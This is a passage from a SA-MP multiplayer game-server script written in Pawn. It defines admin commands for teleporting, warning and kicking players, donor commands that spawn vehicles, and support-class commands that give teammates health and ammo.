			    	AddVehicleComponent(LVehicleIDt,1055); AddVehicleComponent(LVehicleIDt,1058); AddVehicleComponent(LVehicleIDt,1064); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1073); ChangeVehiclePaintjob(LVehicleIDt,1);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 8:
	            {
			        LVehicleIDt = CreateVehicle(562,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
				    AddVehicleComponent(LVehicleIDt,1034); AddVehicleComponent(LVehicleIDt,1038); AddVehicleComponent(LVehicleIDt,1147); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1073); ChangeVehiclePaintjob(LVehicleIDt,1);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 9:
	            {
			        LVehicleIDt = CreateVehicle(567,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
				    AddVehicleComponent(LVehicleIDt,1102); AddVehicleComponent(LVehicleIDt,1129); AddVehicleComponent(LVehicleIDt,1133); AddVehicleComponent(LVehicleIDt,1186); AddVehicleComponent(LVehicleIDt,1188); ChangeVehiclePaintjob(LVehicleIDt,1); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1085); AddVehicleComponent(LVehicleIDt,1087); AddVehicleComponent(LVehicleIDt,1086);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 10:
	            {
			        LVehicleIDt = CreateVehicle(558,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
			   		AddVehicleComponent(LVehicleIDt,1092); AddVehicleComponent(LVehicleIDt,1166); AddVehicleComponent(LVehicleIDt,1165); AddVehicleComponent(LVehicleIDt,1090);
				    AddVehicleComponent(LVehicleIDt,1094); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1087); AddVehicleComponent(LVehicleIDt,1163);//SPOILER
				    AddVehicleComponent(LVehicleIDt,1091); ChangeVehiclePaintjob(LVehicleIDt,2);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 11:
	            {
			        LVehicleIDt = CreateVehicle(557,X,Y,Z,Angle,1,1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
					AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1081);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 12:
	            {
			        LVehicleIDt = CreateVehicle(535,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
					ChangeVehiclePaintjob(LVehicleIDt,1); AddVehicleComponent(LVehicleIDt,1109); AddVehicleComponent(LVehicleIDt,1115); AddVehicleComponent(LVehicleIDt,1117); AddVehicleComponent(LVehicleIDt,1073); AddVehicleComponent(LVehicleIDt,1010);
				    AddVehicleComponent(LVehicleIDt,1087); AddVehicleComponent(LVehicleIDt,1114); AddVehicleComponent(LVehicleIDt,1081); AddVehicleComponent(LVehicleIDt,1119); AddVehicleComponent(LVehicleIDt,1121);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 13:
	            {
			        LVehicleIDt = CreateVehicle(562,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
			  		AddVehicleComponent(LVehicleIDt,1034); AddVehicleComponent(LVehicleIDt,1038); AddVehicleComponent(LVehicleIDt,1147);
					AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1073); ChangeVehiclePaintjob(LVehicleIDt,0);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
				default:
				{
                    SendClientMessage(playerid,red,"Use id's from 1 to 13 only!");
				}
	        }
	        return 1;
		}
		else return SendClientMessage(playerid,red,"You already have a vehicle");
	}
	else return SendClientMessage(playerid,red,"You need to be on /adminduty to use this command");
}


CMD:teleplayer(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/teleplayer [playerid] to [playerid]");
		new player1 = strval(tmp), player2 = strval(tmp2), string[128], Float:plocx,Float:plocy,Float:plocz;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
 		 	if(IsPlayerConnected(player2) && player2 != INVALID_PLAYER_ID) {
	 		 	CMDMessageToAdmins(playerid,"TELEPLAYER");
				GetPlayerPos(player2, plocx, plocy, plocz);
				new intid = GetPlayerInterior(player2);	SetPlayerInterior(player1,intid);
				SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(player2));
				if (GetPlayerState(player1) == PLAYER_STATE_DRIVER)
				{
					new VehicleID = GetPlayerVehicleID(player1);
					SetVehiclePos(VehicleID, plocx, plocy+4, plocz); LinkVehicleToInterior(VehicleID,intid);
					SetVehicleVirtualWorld(VehicleID, GetPlayerVirtualWorld(player2) );
				}
				else SetPlayerPos(player1,plocx,plocy+2, plocz);
				format(string,sizeof(string),"Administrator \"%s\" has teleported \"%s\" to \"%s's\" location", pName(playerid), pName(player1), pName(player2) );
				SendClientMessage(player1,blue,string); SendClientMessage(player2,blue,string);
				format(string,sizeof(string),"You have teleported \"%s\" to \"%s's\" location", pName(player1), pName(player2) );
 		 	    return SendClientMessage(playerid,blue,string);
 		 	} else return SendClientMessage(playerid, red, "Player2 is not connected");
		} else return SendClientMessage(playerid, red, "Player1 is not connected");
	} else return SendClientMessage(playerid,red,"JikyBot: you must be on adminduty to use this command.");
}

CMD:goto(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/goto [playerid]");
	    new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GOTO");
			new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z); SetPlayerInterior(playerid,GetPlayerInterior(player1));
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(player1));
			if(GetPlayerState(playerid) == 2) {
				SetVehiclePos(GetPlayerVehicleID(playerid),x+3,y,z);	LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(player1));
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(player1));
			} else SetPlayerPos(playerid,x+2,y,z);
			format(string,sizeof(string),"You have teleported to \"%s\"", pName(player1));
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:vgoto(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/vgoto [vehicleid]");
	    new player1, string[128];
	    player1 = strval(params);
		CMDMessageToAdmins(playerid,"VGOTO");
		new Float:x, Float:y, Float:z;	GetVehiclePos(player1,x,y,z);
		SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(player1));
		if(GetPlayerState(playerid) == 2) {
			SetVehiclePos(GetPlayerVehicleID(playerid),x+3,y,z);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), GetVehicleVirtualWorld(player1) );
		} else SetPlayerPos(playerid,x+2,y,z);
		format(string,sizeof(string),"You have teleported to vehicle id %d", player1);
		return SendClientMessage(playerid,blue,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:vget(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/vget [vehicleid]");
	    new player1, string[128];
	    player1 = strval(params);
		CMDMessageToAdmins(playerid,"VGET");
		new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z);
		SetVehiclePos(player1,x+3,y,z);
		SetVehicleVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
		format(string,sizeof(string),"You have brough vehicle id %d to your location", player1);
		return SendClientMessage(playerid,blue,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:lgoto(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
		new Float:x, Float:y, Float:z;
        new tmp[256], tmp2[256], tmp3[256];
		new string[128], Index;	tmp = strtok(params,Index); tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
    	if(isnull(tmp) || isnull(tmp2) || !strlen(tmp3)) return SendClientMessage(playerid,red,"JikyBot: Usage:/lgoto [x] [y] [z]");
	    x = strval(tmp);		y = strval(tmp2);		z = strval(tmp3);
		CMDMessageToAdmins(playerid,"LGOTO");
		if(GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
		else SetPlayerPos(playerid,x,y,z);
		format(string,sizeof(string),"You have teleported to %f, %f, %f", x,y,z); return SendClientMessage(playerid,blue,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


CMD:get(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/get [playerid]");
    	new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GET");
			new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z); SetPlayerInterior(player1,GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
			if(GetPlayerState(player1) == 2)	{
			    new VehicleID = GetPlayerVehicleID(player1);
				SetVehiclePos(VehicleID,x+3,y,z);   LinkVehicleToInterior(VehicleID,GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(player1),GetPlayerVirtualWorld(playerid));
			} else SetPlayerPos(player1,x+2,y,z);
			format(string,sizeof(string),"You have been teleported to Administrator \"%s's\" location", pName(playerid) );	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have teleported \"%s\" to your location", pName(player1) );
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be on adminduty to use this command");
}

CMD:pget(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/pget [playerid]");
    	new player1, string[128];
		if(!IsNumeric(params)) player1 = ReturnPlayerID(params);
	   	else player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GET");
			new Float:x, Float:y, Float:z;	GetPlayerPos(playerid,x,y,z); SetPlayerInterior(player1,GetPlayerInterior(playerid));
			SetPlayerVirtualWorld(player1,GetPlayerVirtualWorld(playerid));
			if(GetPlayerState(player1) == 2)	{
			    new VehicleID = GetPlayerVehicleID(player1);
				SetVehiclePos(VehicleID,x+3,y,z);   LinkVehicleToInterior(VehicleID,GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(GetPlayerVehicleID(player1),GetPlayerVirtualWorld(playerid));
			} else SetPlayerPos(player1,x+2,y,z);
			format(string,sizeof(string),"You have been teleported to Administrator \"%s's\" location", pName(playerid) );	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have teleported \"%s\" to your location", pName(player1) );
			TogglePlayerControllable(player1, false);
			PlayerInfo[player1][Frozen] = 1;
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:warn(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
	    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/warn [playerid] [reason]");
    	new warned = strval(tmp), str[128];
		if(PlayerInfo[warned][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
	 	if(IsPlayerConnected(warned) && warned != INVALID_PLAYER_ID) {
 	    	if(warned != playerid) {
 	    	if(Anti_Warn[warned] == 1) return SendClientMessage(playerid, orange,"Player Already Warned");
			    CMDMessageToAdmins(playerid,"WARN");
				PlayerInfo[warned][Warnings]++;
				if(PlayerInfo[playerid][Level] >= 1) {
				if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
					format(str, sizeof (str), "Administrator \"%s\" has kicked \"%s\". (Warning: %d/%d)***", pName(playerid), pName(warned),  PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(red, str);
					format(str, sizeof (str), "[Reason: %s]",params[1+strlen(tmp)]);
					SendClientMessageToAll(red, str);
					format(str, sizeof (str), "3Administrator \"%s\" has kicked \"%s\". (Warning: %d/%d)***", pName(playerid), pName(warned),  PlayerInfo[warned][Warnings], MAX_WARNINGS);
					IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					format(str, sizeof (str), "3[Reason: %s]",params[1+strlen(tmp)]);
     IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					SaveToFile("KickLog",str);	Kick(warned);
					return PlayerInfo[warned][Warnings] = 0;
				} else {
					format(str, sizeof (str), "*Administrator \"%s\" has warned \"%s\". (Warning: %d/%d)***", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(yellow, str);
					format(str, sizeof (str), "[Reason: %s]",  params[1+strlen(tmp)]);
				    SendClientMessageToAll(yellow, str);
				    format(str, sizeof (str), "*3Administrator \"%s\" has warned \"%s\". (Warning: %d/%d)***", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					format(str, sizeof (str), "3[Reason: %s]",  params[1+strlen(tmp)]);
				    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
				    Anti_Warn[warned] = 1;
				    Warn[playerid] = warned;
				    format(str, 9909, "{FF7E19}Name: %s\n{00F700}Admin: %s\n{E10000}Reason: %s\n{FF9E00}Warning: %d/%d",pName(warned),pName(playerid),params[1+strlen(tmp)], PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    ShowPlayerDialog((warned), 9909, DIALOG_STYLE_MSGBOX, "{00F700}Warned", str, "Close", "");
					}
				}
				else if(PlayerInfo[playerid][Helper] == 1)
				{
                   if( PlayerInfo[warned][Warnings] == MAX_WARNINGS) {
					format(str, sizeof (str), "*Server Tester \"%s\" has kicked \"%s\". (Warning: %d/%d)***", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    SendClientMessageToAll(red, str);
					format(str, sizeof (str), "[ Reason: %s ]",params[1+strlen(tmp)]);
					SendClientMessageToAll(red, str);
					format(str, sizeof (str), "3*Server Tester \"%s\" has kicked \"%s\". (Warning: %d/%d)***", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
                     IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					format(str, sizeof (str), "3[ Reason: %s ]",params[1+strlen(tmp)]);
					 IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					SaveToFile("KickLog",str);	Kick(warned);
					return PlayerInfo[warned][Warnings] = 0;
				    } else {
					format(str, sizeof (str), "*Server Tester \"%s\" has given \"%s\" a warning.( Warning: %d/%d )***", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					SendClientMessageToAll(yellow, str);
					format(str, sizeof (str), "[Reason: %s]",params[1+strlen(tmp)]);
					SendClientMessageToAll(yellow, str);
					format(str, sizeof (str), "*3Server Tester \"%s\" has given \"%s\" a warning.( Warning: %d/%d )***", pName(playerid), pName(warned), PlayerInfo[warned][Warnings], MAX_WARNINGS);
					IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					format(str, sizeof (str), "3[Reason: %s]",params[1+strlen(tmp)]);
					IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
					Anti_Warn[warned] = 1;
					Warn[playerid] = warned;
					format(str, 1090, "{FF7E19}Name: %s\n{00F700}Server Tester: %s\n{E10000}Reason: %s\n{FF9E00}Warning: %d/%d",pName(warned),pName(playerid),params[1+strlen(tmp)], PlayerInfo[warned][Warnings], MAX_WARNINGS);
                    ShowPlayerDialog((warned), 1090, DIALOG_STYLE_MSGBOX, "{00F700}Warned", str, "Close", "");
					}
				}
				Anti_Warn[warned] = 1;
				SetTimerEx("AntiWarn", 5000, true, "i", playerid);
				return 1;
			} else return SendClientMessage(playerid, red, "JikyBot: You cannot warn yourself");
		} else return SendClientMessage(playerid, red, "JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


forward AntiWarn(playerid);
public AntiWarn(playerid)
{
  Anti_Warn[Warn[playerid]] = 0;
}

CMD:kick(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/kick [playerid] [reason]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Level] >= 10) return SendClientMessage(playerid,red,"JikyBot: This Admin Cannot be Kicked");
				if(PlayerInfo[player1][Level] >= 9) return SendClientMessage(playerid,red,"JikyBot: This Admin Cannot be Kicked");
				if(PlayerInfo[player1][Level] >= 8) return SendClientMessage(playerid,red,"JikyBot: This Admin Cannot be Kicked");
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"KICK");
				if(PlayerInfo[playerid][LoggedIn] == 1)
				{
				if(PlayerInfo[playerid][Level] >= 1)
				{
				if(isnull(tmp2)) {
					format(string,sizeof(string),"%s has been kicked by Administrator %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"[ No Reason Given ]",params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"3%s has been kicked by Administrator %s ",playername,adminname,params[2]); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					format(string,sizeof(string),"3[ No Reason Given ]",params[2]);  IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					SaveToFile("KickLog",string); print(string); return SetTimerEx("DelayedKick", 1000, false, "i", player1);
				} else {
					format(string,sizeof(string),"%s has been kicked by Administrator %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"[ Reason: %s ]",params[2]); SendClientMessageToAll(red,string);
					format(string,sizeof(string),"3%s has been kicked by Administrator %s ",playername,adminname,params[2]); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					format(string,sizeof(string),"3[ Reason: %s ]",params[2]); IRC_GroupSay(gGroupID, IRC_CHANNEL, string);
					SaveToFile("KickLog",string); print(string); return SetTimerEx("DelayedKick", 1000, false, "i", player1); }
				}
			}
		    if(PlayerInfo[playerid][Helper] == 1)
				{
                  if(isnull(tmp2)) {
					format(string,sizeof(string),"%s has been kicked by Server Tester %s [no reason given] ",playername,adminname); SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string);
					print(string);
					return SetTimerEx("DelayedKick", 1000, false, "i", player1);
				} else {
					format(string,sizeof(string),"%s has been kicked by Server Tester %s Because of : %s ",playername,adminname,params[2]); SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string);
					print(string);
					return SetTimerEx("DelayedKick", 1000, false, "i", player1); }
				}
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dbike(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 2)
		{
			if(Block_CMD[playerid][6] == false)
			{
				CarSpawner(playerid,522);
				SendClientMessage(playerid,blue,"Bike Spawned.");
				Block_CMD[playerid][6] = true;
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,6); // gogo
				SendCMDMessge(playerid,"DBIKE");
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 5 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 2 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dtrain(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][dRank] >= 3)
		{
			if(Block_CMD[playerid][6] == false)
			{
				CarSpawner(playerid,449);
				SendClientMessage(playerid,blue,"tram spawned.");
				Block_CMD[playerid][6] = true;
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,6); // gogo
				SendCMDMessge(playerid,"DBIKE");
			}
		else return SendClientMessage(playerid,red,"JikyBot: You have to wait 5 minutes!");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 5 To Use This Command");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:dtime(playerid,params[]) {
	if(PlayerInfo[playerid][dRank] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/dtime [hour]");
		new time = strval(params), string[128];
		SendCMDMessge(playerid,"DTIME");
		format(string,sizeof(string),"Time change to %d:00", time); SendClientMessage(playerid,blue,string);
		return SetPlayerTime(playerid, time, 0);
	} else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 2 To Use This Command");
}
CMD:dweather(playerid, params[])
{

       if(PlayerInfo[playerid][dRank] >= 2) {
        new weather;
        if(sscanf(params, "i", weather)) return SCM(playerid, red, "JikyBot: Usage:/Dweather (Weather-Id)");
        if(weather > 45 || weather < 0) return SCM(playerid, red, "JikyBot: Invalid Weather-Id.");
        SCM(playerid, -1, "Weather changed successfully.");
		return SetPlayerWeather(playerid, weather);
	} else return SendClientMessage(playerid,red,"JikyBot: You Need Atleast Donor Rank 2 To Use This Command");
}
CMD:shelp(playerid,params[]) {
 if(gClass[playerid] == SP) {
		SetPlayerHealth(playerid,100);
		SendClientMessage(playerid,yellow,"Supporter Help:");
		SendClientMessage(playerid,blue,"/SHeal - Support Your Team Mate In Range A Health Pack.");
		SendClientMessage(playerid,blue,"/SAmmo - Support Your Team Mate In Range A Large Ammo Pack.");
		SendClientMessage(playerid,blue,"/SArmour - Support Your Team Mate In Range A Armour Pack.");
		SendClientMessage(playerid,blue,"/SWeaps - Support Your team mate in Range Weapons.");
		SendClientMessage(playerid,yellow,"More Supporter Commands Will Be Added.");

   } else return SendClientMessage(playerid,red,"JikyBot: Your Must Be Support Class.");
   return 1;
}
CMD:sammo(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(gClass[playerid] == SP)
		{
			if(Block_CMD[playerid][2] == false)
			{
				new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
                new Float:x, Float:y, Float:z;
                GetPlayerPos(playerid, x, y, z);
				SendClientMessage(playerid,blue,"Support Ammo Package.");
				Block_CMD[playerid][2] = true;
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,2);
				foreach(Player, i)
				{
                	if(IsPlayerInRangeOfPoint(i,8.0, x, y, z)) GiveAmmo(i);
               	}
			}
		else return SendClientMessage(playerid,red,"JikyBot: You need to wait (5) minutes.");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need To Be Support Class.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:sheal(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(gClass[playerid] == SP)
		{
			if(Block_CMD[playerid][3] == false)
			{
				new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
                new Float:x, Float:y, Float:z;
                GetPlayerPos(playerid, x, y, z);
				SendClientMessage(playerid,blue,"Support Health Package.");
				Block_CMD[playerid][3] = true;
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,3);
				foreach(Player, i)
				{
                	if(IsPlayerInRangeOfPoint(i,5.0, x, y, z) ) SetPlayerHealth(i,100);
               	}
			}
		else return SendClientMessage(playerid,red,"JikyBot: You need to wait (5) minutes.");
		}
	  else return SendClientMessage(playerid,red,"JikyBot: You Need To Be Support Class.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:sweaps(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(gClass[playerid] == SP)
		{
			if(Block_CMD[playerid][14] == false)
			{
				new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
                new Float:x, Float:y, Float:z;
                GetPlayerPos(playerid, x, y, z);
				SendClientMessage(playerid,blue,"Supported Weapons.");
				Block_CMD[playerid][14] = true;
				SetTimerEx("EnableCMD",300000,false,"dd",playerid,14);
				GivePlayerWeapon(playerid, 24,50);
				//GivePlayerWeapon(playerid, 27,50);
				GivePlayerWeapon(playerid, 32,70);
				//GivePlayerWeapon(playerid, 7,2);
                return 1;
			}
			else return SendClientMessage(playerid,red,"JikyBot: You need to wait (5) minutes.");
		}
  		else return SendClientMessage(playerid,red,"JikyBot: You Need To Be Support Class.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:sarmour(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(gClass[playerid] == SP)
		{
			if(Block_CMD[playerid][17] == false)
			{
